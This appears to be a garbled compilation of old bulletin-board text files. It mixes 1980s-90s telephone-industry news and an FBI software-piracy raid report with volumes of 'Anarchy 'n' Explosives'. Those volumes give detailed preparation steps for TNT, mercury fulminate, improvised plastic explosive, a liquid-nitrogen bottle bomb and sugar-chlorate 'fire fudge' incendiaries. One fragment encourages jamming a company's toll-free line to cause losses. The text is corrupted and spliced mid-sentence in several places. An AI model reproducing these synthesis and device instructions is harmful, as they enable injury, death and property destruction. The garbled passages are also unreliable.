valid basis for our dispute."
     AT&T's long-distance rates have fallen by about 34 percent since the
company was stripped of its local operating companies by an antitrust decree
nearly four years ago.
     Since then, phone rate payers have been paying a larger share of the costs
of maintaining the local network through monthly subscriber line charges, now
$2.60 for residential customers.
     That has reduced the long-distance companies' share of local network
expenses, which they pay in the form of access charges.
     Jack Grubman, a telephone analyst with PaineWebber Inc., said AT&T's
proposal targets business customers because "that's where the competition is
and where the better (profit) margins are." In addition, it aims to keep the
pressure on competition in international calling by extending discounts to
more customers. Grubman added that, if the company's rate proposal is approved
by the FCC, he would expect no further cuts in AT&T rates in 1988.
     Wendell Lind, AT&T administrator of rates and tariffs, said the cuts for
business and residential customers are about the same because business cuts
are offset by a proposed $128 million increase in AT&T's private line rates.
     AT&T is the only long-distance company whose rates are regulated by the
FCC, but its prices set the pace for the industry. Though AT&T is far larger
than any of its competitors, its market share has been declining since
divestiture and the company now says it serves about 75 percent of the market.
     In addition to the reductions in basic long-distance rates, AT&T proposed
cutting prices by 5 percent and 5.7 percent for its Pro-America calling plans.
     The company also proposed to reduce prices by 2.9 percent for its 800
Service customers and 4.4 percent for WATS customers, although it would
increase the monthly access line charges for those plans by $3.20 to reflect
higher special access charges filed by the local phone companies.

==============================================================================
     ORLANDO, Fla. -- US Sprint Wednesday announced its long distance
operators who began saying, "May I help you?" just five months ago, are now
handling 3.5 million calls a month.
     The fiber-optic long-distance carrier, offering the only operator service
alternative to AT&T has experienced a 40 percent growth in operator service
calls since it announced its service July 1.
     Amanda Weathersby, US Sprint vice president of product marketing, said
Tuesday, "More and more people are taking advantage of our call completion
assistance and alternative billing arrangements.
     "Customer surcharges are the same as AT&T with the added benefit of US
Sprint's fiber-optic quality and lower long-distance rates."
     US Sprint currently offers person-to-person, station-to-station, call
completion and collect calling. US Sprint has announced an agreement with US
WEST Service Link that will allow anyone to call on US Sprint and charge
their calls to a Regional Bell Operating Co. calling card beginning in first
quarter 1988.
     "Previously, our operator service was available only on pre-subscribed
US Sprint phones and recently we added operator assistance for US Sprint FON
CARD customers," Weathersby said.
     "With this new agreement, we'll be able to expand our operator service
to markets such as pay phones, hospitals, and hotels/motels."
     The newest 24-hour operator service center in Dallas began operations on
Oct. 5.  US Sprint's other operator service centers are  in:  Cherry Hill,
N.J.; Atlanta; Lombard, Ill. and Reno, Nev.

=             Pacific Bell Pursuing Calling Card Thief                       =
==============================================================================
     SAN FRANCISCO--(BW)--Pacific Bell is warning consumers to protect their
telephone calling cards like any other credit card in the wake of a series of
frauds by people posing as phone company employees.
     A Pacific Bell spokesman says customers in the 213, 805 and 916 area
codes are being victimized by someone who says he is a telephone company
employee investigating calling card fraud.  The individual calls people at
home at odd hours, asking for their calling card numbers.  He then sells the
numbers to people who use the numbers to make long distance phone calls.
     As recently as Monday of this week, 180 long distance calls were billed
to a Sacramento area resident who had given his number to the thief just three
hours earlier.
     According to Pacific Bell, this kind of scheme and other forms of calling
card fraud cost telephone customers nationwide half a billion dollars a year.
     The company offered these tips to consumers to avoid becoming a victim of
calling card fraud:
     Never give your calling card number or personal identification number to
anyone.  Any telephone company employee with a legitimate need to know the
number has access to it.    
     Treat your calling card like any other credit card.  Report its loss
immediately by calling the 800 number on the back of the card 800-621-0430.
     If you receive a suspicious call regarding your telephone calling card,
report it by calling the 800 number on the back of the card.    
     If you receive a call from someone claiming to be a telephone company
employee and asking for your calling card number, ask for a name and number to
call back.  Then call the local Pacific Bell business office to report the
incident.
     One suspect was arrested in Southern California last week by a quick
thinking customer who did just that.  Pacific Bell immediately contacted the
local police department.  A suspect holding seven stolen calling card numbers
was arrested minutes later.
     Pacific Bell and long-distance telephone companies will credit customers
for calling card charges determined to be fraudulent.  Pacific Bell is a

                            ANARCHY 'N' EXPLOSIVES
                            ==> PRELUDE VOLUME <==

   For you people that like blowing things up and shit like that, here's
 something that's not as dangerous or as difficult as more of the explosives
 available (or able to create)... It's called the LN2 Bomb (Short for Liquid
 Nitrogen Bomb). Very easy to make:

         Ingredients:     1 Plastic Two Litre Bottle
                            Enough Liquid Nitrogen To Fill The Bottle

         Instructions:    Fill the bottle with liquid nitrogen. Then cap
                          as tightly as possible. The vaporization of the
                          nitrogen will create enough pressure in the
                          bottle (within 5-15 minutes) to break it with
                          a quite strong explosive force... Very Easy...

                        USE AT YOUR OWN RISK....

CHEMTREC: 1-(800) 424-9300.  Alaska, Hawaii and DC (202) 483-7616
Contact:  Chemical  Manufacturers  Association
          2501 M Street, N.W.
          Washington, D.C. 20037.

The Chemical Manufacturers Association  set  up  the  Chemical  Transportation
Emergency  Center  (CHEMTREC)  to provide immediate assistance to those at the
scene of accident,  24 hours a day,  seven days a week.  CHEMTREC maintains an
online  database on the chemical,  physical,  and toxicological properties and
health effects of the thousands of products of the member companies.  CHEMTREC
operates in two stages:  first,  staff provide chemical information for use in
onsite  decisionmaking involving handling the early stages of the problem and,
second,  notifies the manufacturer of the product of  the  accident  for  more
detailed  information  and  appropriate  follow-up.

CHEMNET  is  activated  by  a  call  to  CHEMTREC.  If a member shipper cannot
respond promptly to an incident and a chemical expert is required at  a  site,
then the shipper can authorize a CHEMNET-contracted emergency response company
to go in its place.

The  Chlorine  Institute  in  1972  established  its  Chlorine  Emergency Plan
(CHLOREP),  a  mutual-aid  response  network  of  chlorine  manufacturers  and
packagers,  to provide assistance at chlorine emergencies in the United States
and Canada  through  telephone  instructions  to  on-scene  personnel  or  the
dispatching  of  trained  teams  to sites.  Response is activated by a call to
CHEMTREC which in turn calls the designated CHLOREP contact,  who notifies the
appropriate   team  leader  based  upon  CHLOREP's  geographical  sector  team
assignments.

useless, toll free numbers"    Well, what you use this information for is up
to you, and if you want to use it for some thing like... well, like, forcing
that line to be busy for 2 straight days thus causing the company to lose money,
is completely up to you.

                            =====> VOLUME 2 <=====

    This volume defines a few varieties of misc explosives, charges, and
       whatever I had in mind at that time. Anyway, these formulas are not
       as precise in measurements for they were given in brief summary.
       However, they will work, and if used correctly can be safe and "fun".

    FRENCH AMMONAL:
-------------------
            Type: Low Explosive
     Ingredients: 86% Ammonium Nitrate
                   6% Stearic Acid
                   8% Aluminum Powder
     Description: French ammonal is an easily improvised low explosive
                  mixture. It is generally less effective than an equal
                  weight of TNT. The material is loaded by pressing it into
                  a suitable container. Initiation by an Engineer's special
                  blasting cap is recommended.
        Comments: This material was tested. It is effective.
      References: TM 31-201-1, Unconventional Warfare Devices and Techniques,
                  para 1401.

    TETRYTOL:
-------------
            Type: High Explosive
     Ingredients: 75% Tetryl
                  25% TNT
     Description: Tetryol is a high explosive bursting charge. It is used as
                  a demolition explosive, a bursting charge for mines, and
                  in artillery shells. The explosive force of tetrytol is
                  approximately the same as that of TNT. It may be initiated
                  by a blasting cap. Tetrytol is usually loaded by casting.
        Comments: This material was tested. It is effective.

    IMPROVISED PLASTIC EXPLOSIVE FILLER:
----------------------------------------
            Type: High Explosive
     Ingredients: Finely Powdered Potassium Chlorate Cdata  bstals
                  Petroleum Jelly        **MIX THOUROUGHLY**
     Description: This plastic explosive filler can be detonated with a
                  No. 8 commercial blasting cap or with any military
                  blasting cap. The explosive must be stored in a waterproof
                  container until ready to use.
        Comments: This material was tested. It is effective.
      References: TM 31-210, Improvised Munitions, sec I, No. 1.

    FLAMABILITY OF GASES:
-------------------------
            Type: Gas Explosive
     Ingredients: Explosive Gas
     Description: Under some conditions, common gases act as fuel. When mixed
                  with air, they will burn rapidly or even explode. For some
                  fuel-air mixtures, the range over which the explosion can
                  occur is quite wide while for others the limits are narrow.
                  The upper and lower amounts of common fuels that will cause
                  an ignitable mixture are shown in the table below. The
                  quantity shown is the percentage by volume of air. If the
                  fuel-air mixture is too lean or too rich, it will not
                  ignite. The amounts shown are therefore called limits of
                  inflamability.
                                                   Gases (% by volume of air)
                  Fuel (Gas)                       Lower Limit    Upper Limit
                  -------------------------------  -----------    -----------
                  Water Gas Or Blue Gas                7.0             72

                  Acetylene                            2.5             81

        Comments: These fuels have been tested under labratory conditions.
                  They are effective. Ignition depends on method of
                  initiation, uniformity of mixture, and physical conditions.

                            ANARCHY 'N' EXPLOSIVES
                            =====> VOLUME 3 <=====

  This is the MOST important or one of the most important volumes regarding
the various mixtures of anarchy that I will be "publishing" to the "public".
Also, it may as well be the MOST DANGEROUS to prepare, the substance we will
be dealing with is Trinitrotoluene, or short - TNT. This high expolosive
is a VERY DANGEROUS, slightly unstable substance. The crystalized crude TNT
is about the color of brown sugar and feels greasy to the touch. It is
suitable for many uses as a high-explosive, but not for the use in high-
explosive shells. It is also highly reactive to many other chemical
substances. It can be incorporated into dynamite and many other explosives
that will be explained in further detail later, in other volumes of ANARCHY.

                                   WARNING:
  DO NOT ATTEMPT TO FINISH THIS PROJECT UNLESS YOU ARE FULLY CAPABLE SAFELY
  EXECUTING THE PROCESSES IN A SAFE ENVIRONMENT! IF YOU CHOOSE TO CONTINUE,
    READ THE INSTRUCTIONS COMPLETELY THROUGH BEFORE BEGINNING AND HAVE ALL
  MATERIALS AND TOOLS (INCLUDING SAFETY/EMERGENCY EQUIPTMENT) READY FOR USE
  WHEN OR IF THEY ARE NEEDED. THIS IS NOT A JOKE! USE AT YOUR OWN RISK!!!!!

  Preparation of Trinitrotoluene (Three Stages). A mixture of 294 grams
    of concentrated sulfuric acid (density 1.84) and 147 grams of nitric
    acid (density 1.42) is added slowly from a dropping funnel to 100
    grams of toluene in a tall 600-cc. beaker, while the liquid is stirred
    vigorously with an electric stirrer and it's temperature is maintained
    at 30 to 40 degrees celsius by running cold water in the vessel in
    which the beaker is standing. The addition of acid will require from an
    hour to an hour and a half. The stirring is then continued for half an
    hour longer without cooling; the mixture is allowed to stand over night
    in a separatory funnel; the lower layer of spent acid is drawn off; and
    the crude mononitrotoluene is weighed. One-half of it, corresponding to
    50 grams of toluene, is taken for the dinitration.
      The mononitrotoluene (MNT) is dissolved in 109 grams of concentrated
    sulfuric acid (d. 1.84) while the mixture is cooled in running water.
    The solution in a tall beaker is warmed to 50 degrees
  and a mixed acid,
    composed of 54.5 grams each of nitric acid (d. 1.50) and sulfuric acid
    (d. 1.84), is added slowly drop by drop from a dropping funnel while
    the mixture is stirred mechanically. The heat generated by the reaction
    raises the temperature, and the rate of addition of the acid is regulated
    so that the temperature of the mixture lies always between 90 degrees
    and 100 degrees. The addition of the acid will require about 1 hour.
    After the acid has been added, the mixture is stirred for 2 hours longer
    at 90-100 degrees to complete the nitration. Two layers seperate on
    standing. The upper layer consists largely of dinitrotoluene (DNT), but
    probobly contains a certain amount of TNT. The trinitration in the
    laboratory is converniently carried out without separating the DNT from
    the spent acid.

      While the dinitration mixture is stirred actively at a temperature of
    about 90 degrees, 145 grams of fuming sulfuric aced (oleum containing
    15% free SO3) is added slowly by pouring from a beaker. A mixed acid,
    composed of 72.5 grams each of nitric acid (d. 1.50) and the 15% oleum,
    is now added drop by drop with good agitation while the heat of the
    reaction maintains the temperature at 100-115 degrees. After about
    three-quarters of the acid has been added, it will be found necessary
    to apply external heat to maintain the temperature. After all the acid
    has been added (taking 1 1/2 to 2 hours), the heating and stirring are
    continued for 2 hours longer at 100-115 degrees. After the material has
    stood overnight, the upper TNT layer will be found to have solidified
    to a hard cake, and the lower layer of spent acid to be filled with
    cdata  bstals. The acid is filtered through a Buchner funnel (without filter
    paper), and the cake is broken up and washed with water on the same
    filter to remove excess of acid. The spent acid contains considerable
    amounts of TNT in solution; this is precipitated by pouring the acid
    into a large volume of water, filtered off, rinsed with water, and added
    to the main batch. All the of the product is washed three or four times
    by agitating it vigorously with hot water under which it is melted.
    After the last washing, the TNT is  granulated by allowing it to cool
    slowly under hot water while the stirring is continued. The product,
    filtered off and dried at ordinary room temperature, is equal to a good
    commercial sample of crude TNT. It may be purified by dissolving in warm
    alcohol at 60 degrees and allowing to cool slowly, or it may be purified
    by digesting with 5 times its weight of 5% sodium hydrogen sulfite
    solution at 90 degrees for half an hour with vigorous stirring, washing
    with hot water until the washings are colorless, and finally granulating
    as before. The product of this last treatment is equal to a good
    commercial sample of purified TNT. Pure ALPHA-TNT, melting point 80.8
    degrees, may be procured by recrystallizing this material once from
    nitric acid (d. 1.42) and once from alcohol.

                 Well, that's it... AND REMEMBER MY WARNING!

                            ANARCHY 'N' EXPLOSIVES
                            =====> VOLUME 4 4 <=====

   In this particular volume, we will be discussing types of Dynamite,
these high-explosives being one of the more important or destructive of the
anarchist's formulas. Note that some of these mixtures are very unstable or
shock ignited, and that care should be observed when handling these unstable
mixtures. Some of these formulae deal with Trinitrotoluene (TNT) and the
preparation for that is given under the volume 3, within this series.

                                   WARNING:
THESE ARE REAL EXPLOSIVES AND MAY CAUSE SERIOUS INJURY OR DEATH UPON MISUSE.
  DO NOT ATTEMPT TO PREPARE ANY AS SAMPLE IF YOU ARE NOT FULLY CAPABLE OF
UNDERSTANDING THE DANGERS AND PRECAUTIONS OF THESE PRODUCTS. THESE FORMULAE
   ARE THE TRUE FORMULAE TO CREATE THESE MIXTURES AND ARE THEREFORE VERY
                      DANGEROUS. USE AT YOUR OWN RISK!!!

Guhr Dynamite:
  Ingredients-  1 part Kieselguhr
                3 parts Nitroglycerin

  Description- This dynamite is primarily used in blasting. It is fairly
               stable, in the drop test, it exploded by the fall of a 1 kg
               weight through 12 to 15 cm., or by the fall of a 2 kg weight
               through 7 cm. The frozen material is less sensitive: a drop of
               more than 20 cm. with a 1 kg weight is needed to explode it,
               and the 2 kg weight is necessary to explode it. Frozen or
               unfrozen, it can be detonated by shooting at it with a
               military rifle, when held in a paper cartridge. Generally,
               it is detonated with a steel-on-steel blow. Velicity of
               detonation vary from 6650 to 6800 meters per second at a
               density loading of 1.50.

                             ANARCHY 'N' EXPLOSIVES
                               VOLUME 5 -- 4/3/89

     Well, hasn't it been long since Volume 4 of Anarchy 'n' Explosives?
Well, I finally got around to typing up another volume. This one will be
dedicated to the extremely simple and more accessible explosives and
incendiaries to be prepared at home, or laboratory; depending upon the
environment you have access to or are accustomed to.

     Anyway, getting back down to business, I must (again), put up this sign:

         WARNING: THESE EXPLOSIVES/INCENDIARIES ARE REAL, NOT TOYS. USE
          EXTREME CAUTION WHEN PREPARING AND APPLYING WHEN APPLICABLE.
                 FAILURE TO DO SO MAY RESULT IN INJURY OR DEATH.
                              USE AT YOUR OWN RISK!

          Enough  of the warnings and notes; for further information and/or
     comments  on  this  series  of  ever popular explosives, contact me (I
     don't  sign  these  "publications") on the Knavery BBS at xxx-xxx-xxxx
     on  the  public message base, I should be reading some requests if you
     leave  them.  And,  volume  number 6 should be coming out sooner than
     the time between 4 and 5, but don't count on it.

BULK POWDERS:
=============

      Bulk  powders are types of gunpowders consisting of nitrocellulose and a
mixture  of  other chemically explosive solutions. These nitrocellulose fibers
are  stuck together, but are not completely collided. Some contain little else
but  nitrocellulose;  others  contain,  in  addition  to  potassium and barium
nitrates,  camphor, vaseline, paraffin, lampblack, starch, dextrine, potassium
dichromate  or  other  oxidizing  or  deterrent  salts,  and diphenylamine for
stabilization, and are colored in a variety of brilliant hues by means of col-
tar  dyes. Three typical bulk powders are made up according to the approximate
formulas tabulated below:

         Nitrocellulose........................ 84.0   87.0   89.0
           % N in nitrocellulose............... 13.2   12.9   12.9
         Potassium nitrate.....................  7.5    6.0    6.0
         Barium nitrate........................  7.5    2.0    3.0
         Starch................................  -.-    -.-    1.0
         Paraffin oil..........................  -.-    4.0    -.-
         Diphenylamine.........................  1.0    1.0    1.0

      The  mixture  is  mixed  in warm water and dried thoroughly. Then either
granulated  or  made  into powder by crushing with a wooden block and screened
through  a  12-mesh sieve. The material is then stored in a moisture-resistant
container for future or immediate use.

MERCURY FULMINATE:
==================
      Mercury  fulminate  is  an  initiating  explosive, commonly appearing as
white  or  gray  crystals.  It  is  extremely sensitive to initiation by heat,
friction,  spark  or  flame, and impact. It detonates when initiated by any of
these  means.  It  is pressed into containers, usually at 3000 psi, for use in
detonators  and blasting caps. However, when compressed at greater and greater
pressure  (up to 30,000 psi), it becomes "dead pressed." In this condition, it
can  only  be detonated by another initial detonating agent. Mercury fulminate
gradually  becomes inert when stored continuously above 100 degrees F. A dark-
colored  product  of  deterioration  gives  evidence  of  this effect. Mercury exfulminate  is  stored underwater except when there is danger of freezing. Then
it is stored under a mixture of water and alcohol.

     Preparation  of  Mercury  Fulminate. Five grams of mercury is addedExt55 
cc.  of nitric acid (specific gravity 1.42) in a 100-cc. Erlenmeyer flask, and
the  mixture  is  allowed  to stand without shaking until the mercury has gone
into  solution. The acid liquid is then poured into 50 cc. of 90% alcohol in a
500-cc.  beaker  in the hood. The temperature of the mixture rises, a vigorous
reaction  commences,  white  fumes  come  off,  and cdata  bstals of fulminate soon
begin  to precipitate. Red fumes appear and the precipitation of the fulminate
becomes  more  rapid,  then white fumes again as the reaction moderates. After
about  20  minutes, the reaction is over; water is added, and the cdata  bstals are
washed  with  water repeatedly by decantation until the washings are no longer
acid   to  litmus.  The  product  consists  of  grayish-yellow  cdata  bstals,  and
corresponds  to a good grade of commercial fulminate. It may be obtained white
and  entirely  pure  by  dissolving  in  strong  ammonia water, filtering, and
reprecipitating  by  the  addition  of  30% acetic acid. The pure fulminate is
filtered  off,  washed  several times with cold water, and stored under water,
or,  if  a very small amount is desired for experimental purposes, it is dried
in a desiccator.

AMATOL:
=======

      Description:  amatol is a high explosive, whit to buff in color. It is a
mixture  of  ammonium  nitrate and TNT, with a relative effectiveness slightly
higher  than  that  of  TNT  alone. Common compositions vary from 80% ammonium
nitrate  and  20%  TNT  to 40% ammonium nitrate and 60% TNT. Amatol is used as
the  main  bursting  charge  in  artillery  shells  and  bombs. Amatol absorbs
moisture  and  can  form dangerous compounds with copper and brass. Therefore,
it should not be housed in containers of such metals.

BLACK POWDERS:
==============

      Black  powders  burn  either  quickly  or  very  slowly depending on the
composition  of  such  a  mixture; however, these powders produce smoke, often
great  amounts,  and  is most useful in applications where smoke is no object.
It  is  the  best for communicating fire and for producing a quick, hot flame.
Black  powder  is  used  in  both  propellant  charges for shrapnel shells, in
saluting  and  blank  fire  charges, as the bursting charge of practice shells
and  bombs,  as a propelling charge in certain pyrotechnic pieces, and, either
with  or  without  the  admixture of other substances which modify the rate of
burning,  in the time-train rings and in other parts of fuses. Below is a list
of black powders and their compositions.

.FBI raids major Ohio computer bulletin board; action follows joint
investigation with SPA

The Federation Bureau of Investigation on Saturday, Jan. 30, 1993, raided
"Rusty & Edie's," a computer bulletin board located in Boardman, Ohio,
which has allegedly been illegally distributing copyrighted software
programs. Seized in the raid on the Rusty & Edie's bulletin board were
computers, hard disk drives and telecommunications equipment, as well as
financial and subscriber records. For the past several months, the Software
Publishers Association ("SPA") has been working with the FBI in
investigating the Rusty & Edie's bulletin board, and as part of that
investigation has downloaded numerous copyrighted business and
entertainment programs from the board.

The SPA investigation was initiated following the receipt of complaints
from a number of SPA members that their software was being illegally
distributed on the Rusty & Edie's BBS. The Rusty & Edie's bulletin board
was one of the largest private bulletin boards in the country.  It had 124
nodes available to callers and over 14,000 subscribers throughout the
United States and several foreign countries.  To date, the board has logged
in excess of 3.4 million phone calls, with new calls coming in at the rate
of over 4,000 per day.  It was established in 1987 and had expanded to
include over 19 gigabytes of storage housing over 100,000 files available
to subscribers for downloading. It had paid subscribers throughout the
United States and several foreign countries, including Canada, Luxembourg,
France, Germany, Finland, the Netherlands, Spain, Sweden and the United
Kingdom.

A computer bulletin board allows personal computer users to access a host
computer by a modem-equipped telephone to exchange information, including
messages, files, and computer programs.  The systems operator (Sysop) is
generally responsible for the operation of the bulletin board and
determines who is allowed to access the bulletin board and under what
conditions. For a fee of $89.00 per year, subscribers to the Rusty & Edie's
bulletin board were given access to the board's contents including many
popular copyrighted business and entertainment packages. Subscribers could
"download" or receive these files for use on their own computers without
having to pay the copyrighted owner anything for them.

"The SPA applauds the FBI's action today," said Ilene Rosenthal, general
counsel for the SPA.  "This shows that the FBI recognizes the harm that
theft of intellectual property causes to one of the U.S.'s most vibrant
industries. It clearly demonstrates a trend that the government understands
the seriousness of software piracy." The SPA is actively working with the
FBI in the investigation of computer bulletin boards, and similar raids on
other boards are expected shortly. Whether it's copied from a program
purchased at a neighborhood computer store or downloaded from a bulletin
board thousands of miles away, pirated software adds to the cost of
computing.  According to the SPA, in 1991, the software industry lost $1.2
billion in the U.S. alone. Losses internationally are several billion
dollars more.

"Many people may not realize that software pirates cause prices to be
higher, in part, to make up for publisher losses from piracy," says Ken
Wasch, executive director of the SPA.  In addition, they ruin the
reputation of the hundreds of legitimate bulletin boards that serve an
important function for computer users." The Software Publishers Association
is the principal trade association of the personal computer software
industry.  It's over 1,000 members represent the leading publishers in the
business, consumer and education software markets. The SPA has offices in
Washington DC, and Paris, France.

                       ==================================
                          by Doctor Dissector, 6/14/89

     Well, this is the sixth, infamous, release of Anarchy n' Explosives...
Previously, I did not place my name on the issues 0-5, but for credits sake, I
decided to place my name on each issue from here on. Anyway, this document is
to be placed into the public domain, but might be originating from some Elite
BBS's and other organizations such as Forgotten Realms at (xxx)xxx-xxxx and
other groups associated with that BBS. And, since it is a public document, the
author assumes no responsibility of misuse by irresponsible or ignorant
parties, who may directly, or indirectly, gain injury to themselves or others,
with the information contained in this document. Allright,,, enough of the
shit, lets get down to business!

WARNING: THE FOLLOWING INFORMATION CAN INJURY OR DEATH UPON ITS MISUSE. AUTHOR
ASSUMES NO RESPONSIBILITY FOR ANY DAMAGES, PROPERTY OR BODILY, FROM ACTIONS
DUE TO THIS DOCUMENT. PLEASE HANDLE WITH CARE, AND USE AT YOUR OWN RISK!!

     Ok, now we can rock! This issue, #6, will deal with the basic
pyrotechnical devices, which might be enhanced by or an addition to other
anarchy projects you have or were covered in previous issues of ANARCHY 'N'
EXPLOSIVES. The items covered will include srally rockets, serpents, smokes,
whistling fireworks
  and colored flames. Each section will cover, in detail,
several aspects as well as the preparation of each project. Enjoy....

SKY ROCKETS
------------------------------------------------------------------------------
Next to the Roman Candle, these are perhaps the most popular articles of the
pyrotechnical craft and, on good authority, apparently antedate the candle. So
much has been written about sky rockets that any detailed description would be
superfluous. The French, particularly, have left a most complete history,
sometimes amusing, in view of the present status of rocket manufacture. The
rocket consists of a tube of paper rammed with suitable composition, its lower
end choked to about one-third of the diameter of its bore, and having a hollow
center extending upward through the composition to about 3/4 of an inch of the
top. A stick attached to the tube serves to balance it while ascending.
Roughly, the composition of a rocket, that is, the portion of it that is
burning while it is ascending, should be seven times its diameter in length.
Six-sevenths is pierced through the center while one-seventh is solid and acts
as a fuse to communicate the fire to the heading when the rocket reaches the
highest point of its flight.

     The tube is made of strong paper, preferably 3 turns of hardware paper on
the inside with 4 or more turns of straw board or Kraft paper on the outside.
A good rocket case can also be made of heavy rag or building paper, if it is
properly rolled with good paste. The process of choking the case and ramming
in a mold has been practically discontinued. An average model for a 1 pound
rocket is given in the file "ROCKET.ANS" (ANSI graphics format).

     Good rockets should be uniform, all those of one caliber ascending to the
same height and bursting at about the same time. This is particularly
desirable in bouquets of 100 or more, fired simultaneously, or a straggling
effect is produced.

     Most rockets larger than 3 ounces are rammed singly or by gang rammers,
which can be built on a custom basis. Today, hydraulic rammers are also in use.

     For very large rockets, a scoop of clay is shaken in and rammed with
eight good blows of a mallet on the longest rammer. Then, a scoopful of
composition is rammed with about eight lighter blows. This is repeated until
the case is filled to about 1 inch from the top. Shift rammer as it becomes
necessary to use shorter ones. There should be 1 inch of solid composition
above the top end of the spindle. Now the final charge of clay is put in and
the hollow pin rammer is used. This sets the clay while leaving an opening for
the fire to reach the heading. Care must be used to see that the hollow tube
just pierces the clay. If it does not go through, the heading will fail to
fire; if it goes too far, the heading will fire prematurely. (The heading is
the blast charge or whatever you want to ignite) the following are good
compositions for rockets of the different sizes given: (given in weighted
parts)

                    1-3 ounces    4-8 ounces    1-3 pounds    4-8 pounds
Potassium Nitrate      18            16            16            18
Mixed Coal             10             9            12            12
Sulfur                  3             4             3             3

     If rockets burst before ascending, add more coal; if they ascend too
slowly, add more Potassium Nitrate. For the smaller sizes, use fine coal, for
larger, coarser in proportion to the diameter. In 4-8 pound rockets, use
partly granulated Potassium Nitrate.

SERPENTS
------------------------------------------------------------------------------
     The eggs for producing this remarkable article consists of small pelletLE Ont aulfocyanide (thiocyanate) of mercury which has the remarkable property of
swelling 25-50 times its original size when lighted, producing a ling, snake-
like ash. To prepare it, make a concentrated solution of mercuric chloride and
add, little by little, a solution of potassium sulfocyanide, stirring
constantly. A grayish precipitate will be formed, and when the last addition
nt aulfocyanide no longer produces cloudiness, permit the mixture to settle.
Drain the supernatant liquid off as much as possible, remove the precipitate
to a filter paper, placed in a glass funnel, and wash slightly. When it is
thoroughly dried, reduce it to a fine powder. When ready to for the eggs,
moisten the composition very sparingly with a weak solution of gum arabic
which may be added a pinch of potassium nitrate and, made into cones, by
ramming. However, this product is poisonous to man and other living species,
since it is composed of cyanide and mercury. Thus, another formula has been
devised to accommodate safety.

     A safer version of the above serpent can be made of the following:
Naphtha pitch (10), Linseed oil (2), Fuming nitric acid (7), and Picric acid
(3 1/2). Reduce the pitch to a fine powder; add linseed oil and mix well in a
mortar. Add the fuming nitric acid, always a little at a time, Allow to cool
for 1 hour. Wash several times with water, the last time allowing the mass to
stand in the water for several hours. Dry thoroughly; powder finely and add
picric acid, rubbing it in well. Moisten with gum arabic water and form into
pelletL about the size of a #4 star.

SMOKES
------------------------------------------------------------------------------
     This branch of pyrotechny seems to have been somewhat overlooked, though
its possibilities for daylight entertainment as a supplement of night displays
could open an interesting field for those with enough imagination to develop
it.

     There are as many colors and tints of smoke as there are flames and
aerial combinations. The simplest form of the smoke used in pyrotechny is the
smoke pot, as used in spectacles like THE LAST DAYS OF POMPEII and BURNING OF
ROME, where it is desired to give the effect of destruction by fire. Smoke and
spark posts consist of short cases about 4-6 inches in diameter and 6-12
inches in length. A basic formula subject to variation is:

                                  Smoke 1   Smoke 2   Spark 1   White
Potassium Nitrate                    4         6        ---       12
Lampblack                            1        ---       ---       ---
Fine Charcoal                        1        ---        1         1
Realgar                              1        ---       ---       ---
Rosin                                1        ---       ---       ---
Sulfur                              ---      1 1/4      ---       16
Antimony Sulfide                    ---        1        ---       ---
Meal Powder                         ---        1         2        ---
Sawdust                             ---       ---        1        ---

WHISTLING FIREWORKS
------------------------------------------------------------------------------
     The peculiar property of picrate of whistling while burning has been
known for a long time. You can manufacture whistling fireworks using this
substance. In a porcelain receptacle, dissolve 1 pound of picric acid in the
least possible quantity of boiling water; add 1/4 pound of potassium
carbonate, a little at a time, stirring continuously. When effervescence has
subsided, add 1 pound of powdered potassium nitrate. Stir thoroughly, allow to
stand for an hour and then place it on a heavy piece of filter paper in a
glass funnel, to drain. When it is dry, crush to a fine powder with a wooden
roller.

     Although this is a reasonably safe composition, only small quantities
should be handled at a time, as an explosion will cause disastrous result, or
will they? heh heh. The dry powder may be rammed into tubes from 1/4 to 3/4
inches in diameter, and will produce the whistling sound when burned. Bamboo
tubes are most effective.

     Owing to the ease with which potassium picrate detonates, whistles cannot
be use in shells, but small tubes, 1/4 inches in diameter and 2 1/2 inches
long, when charged with the above composition, may be placed in the heads of
rockets or fastened to the outside and arranged to burn while the rocket is
ascending. Attached to wheels, they are quite amusing, but the most effective
use for them is in a series of six or eight, ranging in size from 1/4 to 3/4
inches in diameter, set side by side like a Pandean pipe and burned
simultaneously.

     A non--picrate whistle, safer than the one above, is made from potassium
chlorate (3), and Gallic acid (1). This composition makes a very good whistle

FIRE FUDGE
-----------------------------------------------------------------------------
a. Description.

     (1) This item consists of a mixture of sugar and potassium chlorate in a
         hot water solution which solidifies when cooled to room temperature.
         It can be used to ignite most incendiaries, except thermite. It may
         be used directly as an incendiary on rags, dry paper, dry hay, or in
         the combustible vapor above liquid fuels.

     (2) The igniter can be initiated by a fuse cord, string fuse, or concen-
         trated sulfuric acid.

     (3) Fire fudge resembles a white sugar fudge having a smooth, hard sur-
         face. The advantage of this igniter material over Sugar-Chlorate, is
         its moldability. The procedure for preparation must be followed
         closely to obtain a smooth, uniform material with a hard surface.

         CAUTION: THIS MATERIAL IS POISONOUS AND MUST NOT BE EATEN.

b. Material and Equipment.

     Granulated Sugar (NOT powdered or confectioners)
     Potassium chlorate (no coarser than the sugar)
     Metallic, glass, or enameled pan.
     Measuring container
     Spoon (non-metallic)
     Thermometer (200-250 degrees Fahrenheit)

c. Preparation.

     (1) Clean the pan by boiling some clean water in it for about five
         minutes. Discard the water, pour one measureful of clean water into
         the pan and warm it. Dry the measuring container and add one measure-
         full of sugar. Stir the liquid until the sugar dissolves.

     (2) Boil the solution until a fairly thick syrup is obtained.

     (3) Remove the pan from the source of heat to a distance of at least six
         feet and shut off the heat. Rapidly add two measurefuls of potassium
         chlorate. Stir gently for a minute to mix the syrup and powder, then
         pour or spoon the mixture into appropriate molds. If the mold is
         paper, it can usually be peeled off when the fire fudge cools and
         hardens. Pieces of cardboard or paper adhering to the igniter will
         not impair its use. Pyrex, glass, or ceramic molds can be used when a
         clear, smooth surface is desired. It is recommended that section
         thickness of molded fire fudge be at least one-half inch. If desired,
         molded fire fudge can be safely broken with the fingers.
         CAUTION: IF THIS IGNITER MATERIAL IS CARELESSLY HANDLED WITH
         EXCESSIVE BUMPING OR SCRAPING, IT COULD PRESENT ITSELF AS A HAZARD.

d. Application.

     (1) Place a piece of fire fudge on top of the incendiary. Minimum size
         should be about one inch square and one-half inch thick. Prepare the
         fire fudge for ignition with a fuse cord, string fuse, or
         concentrated sulfuric acid in the normal manner.

     (2) If only battery grade sulfuric acid is available, it must be concen-
         trated before use to a specific gravity of 1.835, by heading it in an
         enameled, heat resistant glass or porcelain pot, until dens, white
         fumes appear.

     (3) When used to ignite flammable liquids, wrap a quantity of the igniter
         mixture in a non-absorbent material and suspend it inside the
         container near the open top. The container must remain open for easy
